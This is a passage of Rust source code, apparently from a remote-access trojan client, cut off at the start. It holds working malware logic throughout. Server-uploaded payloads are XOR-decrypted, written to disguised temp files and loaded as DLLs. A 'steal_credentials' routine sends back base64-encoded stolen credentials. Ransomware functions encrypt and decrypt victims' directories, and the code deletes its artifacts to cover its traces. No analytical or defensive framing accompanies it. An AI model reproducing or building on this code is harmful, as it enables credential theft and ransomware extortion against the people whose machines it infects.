            debug_print!("DEBUG: DLL loaded at: {:p}", h_module);

            let fn_name = CString::new("steal_credentials").unwrap();
            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());

            if fn_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = fs::remove_file(&dll_path);
                return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
            }

            debug_print!("DEBUG: Function found, executing...");

            let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
            let result_ptr = exec_fn();

            if result_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = fs::remove_file(&dll_path);
                return format!("__ERROR__:steal_credentials returned NULL{}", DELIMITER);
            }

            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();

            let free_fn_name = CString::new("free_credentials_string").unwrap();
            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
            if !free_ptr.is_null() {
                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                free_fn(result_ptr);
            }

            FreeLibrary(h_module);
            let _ = fs::remove_file(&dll_path);

            result_str
        };

        fs::remove_file("stealer.enc").ok();
        fs::remove_file("stealer.key").ok();

        debug_print!("DEBUG: Result: {} bytes", result.len());

        if result.starts_with("ERROR:") {
            return format!("__ERROR__:{}{}", result, DELIMITER);
        }

        let encoded = base64_encode(result.as_bytes());
        format!("__CREDENTIALS_B64__:{}{}", encoded, DELIMITER)
    }
}

// ============================================================================
// RANSOMWARE
// ============================================================================
fn encrypt_files(params: &str) -> String {
    debug_print!("DEBUG: Encrypting files with params: {}", params);

    #[cfg(not(target_os = "windows"))]
    {
        return format!("__ERROR__:Ransomware only supported on Windows{}", DELIMITER);
    }

    #[cfg(target_os = "windows")]
    {
        let parts: Vec<&str> = params.split('|').collect();
        if parts.len() < 2 {
            return format!(
                "__ERROR__:Invalid parameters. Usage: __ENCRYPT__:path|max_depth{}",
                DELIMITER
            );
        }

        let path = parts[0].trim();
        let max_depth: u32 = parts[1].trim().parse().unwrap_or(5);

        debug_print!("DEBUG: encrypt_files - path='{}', max_depth={}", path, max_depth);

        if !Path::new("ransomware.enc").exists() {
            return format!(
                "__ERROR__:ransomware.enc not found. Server must upload it first.{}",
                DELIMITER
            );
        }

        if !Path::new("ransomware.key").exists() {
            return format!(
                "__ERROR__:ransomware.key not found. Server must upload it first.{}",
                DELIMITER
            );
        }

        let encrypted_dll = match fs::read("ransomware.enc") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error reading ransomware.enc: {}{}", e, DELIMITER),
        };

        let xor_key = match fs::read("ransomware.key") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error reading ransomware.key: {}{}", e, DELIMITER),
        };

        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);

        use std::ffi::CString;
        use std::os::raw::c_char;
        use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};

        let temp_dir = std::env::temp_dir();
        let random_name = format!("~tmp{}.tmp", std::process::id());
        let dll_path = temp_dir.join(random_name);

        if let Err(e) = fs::write(&dll_path, &dll_bytes) {
            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
        }

        let result = unsafe {
            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
            let h_module = LoadLibraryA(path_cstring.as_ptr());

            if h_module.is_null() {
                let _ = fs::remove_file(&dll_path);
                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
            }

            let fn_name = CString::new("encrypt_directory").unwrap();
            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());

            if fn_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = fs::remove_file(&dll_path);
                return format!("__ERROR__:encrypt_directory not found{}", DELIMITER);
            }

            let path_c = CString::new(path).unwrap();
            let exec_fn: extern "C" fn(*const c_char, u32) -> *mut c_char =
                std::mem::transmute(fn_ptr);
            let result_ptr = exec_fn(path_c.as_ptr(), max_depth);

            if result_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = fs::remove_file(&dll_path);
                return format!("__ERROR__:encrypt_directory returned NULL{}", DELIMITER);
            }

            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();

            let free_fn_name = CString::new("free_string").unwrap();
            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
            if !free_ptr.is_null() {
                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                free_fn(result_ptr);
            }

            // DLL stays loaded for persistent ransomware dialog
            debug_print!("DEBUG: DLL remains loaded for persistent dialog");

            result_str
        };

        fs::remove_file("ransomware.enc").ok();
        fs::remove_file("ransomware.key").ok();

        debug_print!("DEBUG: Result: {}", result);

        if result.starts_with("ERROR:") {
            return format!("__ERROR__:{}{}", result, DELIMITER);
        }

        format!("__RANSOMWARE__:{}{}", result, DELIMITER)
    }
}

fn decrypt_files(params: &str) -> String {
    debug_print!("DEBUG: Decrypting files with params: {}", params);

    #[cfg(not(target_os = "windows"))]
    {
        return format!("__ERROR__:Ransomware only supported on Windows{}", DELIMITER);
    }

    #[cfg(target_os = "windows")]
    {
        let parts: Vec<&str> = params.split('|').collect();
        if parts.len() < 3 {
            return format!(
                "__ERROR__:Invalid parameters. Usage: __DECRYPT__:path|key|max_depth{}",
                DELIMITER
            );
        }

        let path = parts[0].trim();
        let key_hex = parts[1]
            .trim()
            .replace("\x1b[200~", "")
            .replace("\x1b[201~", "")
            .replace("←[200~", "")
            .replace("←[201~", "");
        let max_depth: u32 = parts[2].trim().parse().unwrap_or(5);

        debug_print!(
            "DEBUG: decrypt_files - path='{}', key_hex='{}', max_depth={}",
            path, key_hex, max_depth
        );

        if !Path::new("ransomware.enc").exists() {
            return format!(
                "__ERROR__:ransomware.enc not found. Server must upload it first.{}",
                DELIMITER
            );
        }

        if !Path::new("ransomware.key").exists() {
            return format!(
                "__ERROR__:ransomware.key not found. Server must upload it first.{}",
                DELIMITER
            );
        }

        let encrypted_dll = match fs::read("ransomware.enc") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error reading ransomware.enc: {}{}", e, DELIMITER),
        };

        let xor_key = match fs::read("ransomware.key") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error reading ransomware.key: {}{}", e, DELIMITER),
        };

        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);

        use std::ffi::CString;
        use std::os::raw::c_char;
        use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};

        let temp_dir = std::env::temp_dir();
        let random_name = format!("~tmp{}.tmp", std::process::id());
        let dll_path = temp_dir.join(random_name);

        if let Err(e) = fs::write(&dll_path, &dll_bytes) {
            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
        }

        let result = unsafe {
            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
            let h_module = LoadLibraryA(path_cstring.as_ptr());

            if h_module.is_null() {
                let _ = fs::remove_file(&dll_path);
                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
            }

            let fn_name = CString::new("decrypt_directory").unwrap();
            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());

            if fn_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = fs::remove_file(&dll_path);
                return format!("__ERROR__:decrypt_directory not found{}", DELIMITER);
            }

            let path_c = CString::new(path).unwrap();
            let key_c = CString::new(key_hex).unwrap();
            let exec_fn: extern "C" fn(*const c_char, *const c_char, u32) -> *mut c_char =
                std::mem::transmute(fn_ptr);
            let result_ptr = exec_fn(path_c.as_ptr(), key_c.as_ptr(), max_depth);

            if result_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = fs::remove_file(&dll_path);
                return format!("__ERROR__:decrypt_directory returned NULL{}", DELIMITER);
            }

            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();

            let free_fn_name = CString::new("free_string").unwrap();
            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
            if !free_ptr.is_null() {
                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                free_fn(result_ptr);
            }

            FreeLibrary(h_module);
            let _ = fs::remove_file(&dll_path);

            result_str
        };

        fs::remove_file("ransomware.enc").ok();
        fs::remove_file("ransomware.key").ok();

        debug_print!("DEBUG: Result: {}", result);

        if result.starts_with("ERROR:") {
            return format!("__ERROR__:{}{}", result, DELIMITER);
        }

        format!("__RANSOMWARE__:{}{}", result, DELIMITER)
    }
}
